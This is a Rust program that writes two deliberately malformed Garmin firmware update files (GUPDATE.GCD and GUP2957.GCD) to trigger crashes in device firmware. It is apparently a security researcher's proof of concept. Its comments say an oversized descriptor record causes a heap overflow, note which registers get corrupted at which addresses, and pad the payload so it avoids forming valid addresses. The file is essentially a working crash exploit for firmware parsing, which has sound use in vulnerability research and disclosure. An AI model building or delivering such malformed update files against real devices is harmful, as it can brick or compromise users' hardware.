use gcd_rs::composer::Composer;
use gcd_rs::record::descriptor::descriptor_data::{
    DescriptorData, DescriptorDecoded,
};
use gcd_rs::record::descriptor::DescriptorRecord;
use gcd_rs::record::firmware::FirmwareRecord;
use gcd_rs::record::main::MainRecord;
use gcd_rs::{GcdDefaultEndian, Record};
use std::fs::File;

use anyhow::Result;

//any descriptor header bigger then 128 will calse a heap overflow
fn crash_descriptor_size(file: File) -> Result<()> {
    let mut composer: Composer<File, GcdDefaultEndian> = Composer::new(file)?;

    //dummy value, probably ignored by the firmware
    composer.write_record(&Record::MainHeader(MainRecord::DefaultHWID))?;

    //0x0503 is end of descriptor, this force the end of analizes
    let mut descriptor: Vec<u8> = vec![0x50, 0x03, 0x00, 0x00];
    for i in 0u32..128 {
        match i {
            //probably result of currupting the HEAP:
            //r3 at 0x96740
            //0x20 => descriptor.extend([0;4].iter()),
            //r4 at 0x9672c
            //0x24 => descriptor.extend([0;4].iter()),
            i => {
                let b = i.to_ne_bytes();
                descriptor.push(b[0]);
                descriptor.push(b[1]);
                descriptor.push(b[2]);
                descriptor.push(0xff); // avoid creating valid address for test
            }
        }
    }
    composer.write_record_raw(
        6, //Firmware Descriptor
        &descriptor,
    )?;
    composer.write_record_raw(
        7,        //Firmware Descriptor
        &[0; 32], //dummy for now
    )?;

    composer.write_record(&Record::End)?;
    Ok(())
}
fn crash_main_header(file: File) -> Result<()> {
    let mut composer: Composer<File, GcdDefaultEndian> = Composer::new(file)?;

    composer.write_record_raw(
        3, //Main Header
        &[0xff; 512],
    )?;
    let file = include_bytes!("/home/rbran/src/garmin/firmware/edge130apac/006-B2957-00/2.50/fw1_0x401.bin");
    composer.write_record(&Record::Descriptor(DescriptorRecord::Simple(
        vec![
            DescriptorData::U8 { id: 11, data: 0 },
            DescriptorDecoded::XorKey(0).encode(),
            DescriptorDecoded::FirmwareId(1025).encode(),
            DescriptorDecoded::FirmwareLen(file.len() as u32).encode(),
            DescriptorData::End,
        ],
    )))?;

    composer.write_record(&Record::FirmwareData(FirmwareRecord::Chunk {
        id: 1025,
        data: file.to_vec(),
    }))?;

    composer.write_record(&Record::End)?;
    Ok(())
}

fn main() -> Result<()> {
    let output = File::create("GUPDATE.GCD")?;
    crash_descriptor_size(output)?;
    let output = File::create("GUP2957.GCD")?;
    crash_main_header(output)?;
    Ok(())
}
